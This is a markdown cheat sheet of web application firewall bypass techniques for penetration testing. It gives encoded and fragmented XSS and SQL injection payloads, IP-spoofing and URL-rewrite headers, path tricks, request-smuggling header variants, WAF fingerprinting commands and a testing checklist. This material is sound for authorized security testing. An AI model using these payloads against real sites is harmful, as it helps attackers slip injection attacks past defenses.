# WAF Bypass & Evasion Techniques

## Encoding Bypasses

### URL Encoding
```
<script> → %3Cscript%3E
' OR 1=1 → %27%20OR%201%3D1
```

### Double Encoding
```
<script> → %253Cscript%253E
' → %2527
```

### Unicode/UTF-8 Encoding
```
<script> → \u003cscript\u003e
' → \u0027
```

### Hex Encoding
```
<script> → \x3cscript\x3e
```

### HTML Entity Encoding
```
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

---

## Case Variation
```
<ScRiPt>alert(1)</ScRiPt>
SeLeCt * FrOm users
```

## Null Byte Injection
```
<scr%00ipt>alert(1)</scr%00ipt>
sel%00ect * from users
```

## Comment Injection (SQLi)
```sql
SELECT/**/username/**/FROM/**/users
SELECT/*comment*/username/*comment*/FROM/*comment*/users
SEL/**/ECT username FR/**/OM users
```

## Whitespace Alternatives
```sql
SELECT%09username%09FROM%09users  -- tab
SELECT%0ausername%0aFROM%0ausers  -- newline
SELECT%0dusername%0dFROM%0dusers  -- carriage return
SELECT+username+FROM+users        -- plus sign
```

---

## HTTP Method Evasion

### Method Override Headers
```http
X-HTTP-Method: DELETE
X-HTTP-Method-Override: PUT
X-Method-Override: PATCH
```

### Arbitrary Methods
```
GET /admin → JEFF /admin
POST /api → FAKE /api
```

---

## IP Spoofing Headers
```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

---

## Path Manipulation
```
/admin → /admin/
/admin → /admin;
/admin → /admin..;
/admin → /admin%20
/admin → /%61dmin
/admin → /./admin
/admin → /admin.json
```

## URL Rewrite Headers
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
```

---

## Payload Fragmentation

### Split Keywords
```html
<scr<script>ipt>alert(1)</script>
```

### Break with Tags
```html
<img src=x onerror="ale"+"rt(1)">
```

### Concatenation (SQLi)
```sql
CONCAT('sel','ect')
'sel' || 'ect'
```

---

## Content-Type Manipulation
```http
Content-Type: application/json
Content-Type: application/xml
Content-Type: text/plain
Content-Type: multipart/form-data
Content-Type: application/x-www-form-urlencoded; charset=ibm500
```

## Charset Tricks
```http
Content-Type: text/html; charset=utf-7
Content-Type: text/html; charset=utf-16
Content-Type: text/html; charset=ibm037
```

---

## Request Smuggling
```http
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding : chunked  (space before colon)
Transfer-Encoding: xchunked
Transfer-Encoding: chunked, identity
```

---

## WAF Detection Tools
```bash
# Wafw00f
wafw00f https://target.com

# Nmap
nmap -p80,443 --script http-waf-detect target.com
nmap -p80,443 --script http-waf-fingerprint target.com

# WhatWaf
whatwaf -u https://target.com
```

## Common WAF Signatures
| Header/Behavior | WAF |
|-----------------|-----|
| `cf-ray` header | Cloudflare |
| `x-sucuri-id` | Sucuri |
| `x-akamai-*` | Akamai |
| `x-amz-*` | AWS WAF |
| `x-cdn: Incapsula` | Imperva |
| `server: AkamaiGHost` | Akamai |

---

## Testing Methodology

1. **Identify WAF** - Use wafw00f, check headers
2. **Test baseline** - Normal request behavior
3. **Test OWASP Top 10** - SQLi, XSS, CSRF, etc.
4. **Try encoding** - URL, double, hex, unicode
5. **Try case variation** - Mixed case keywords
6. **Try fragmentation** - Split payloads
7. **Try headers** - X-Forwarded-For, X-Original-URL
8. **Check false positives** - Legitimate traffic blocked?
9. **Check false negatives** - Known attacks passing?

## References
- https://github.com/0xInfection/Awesome-WAF
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass
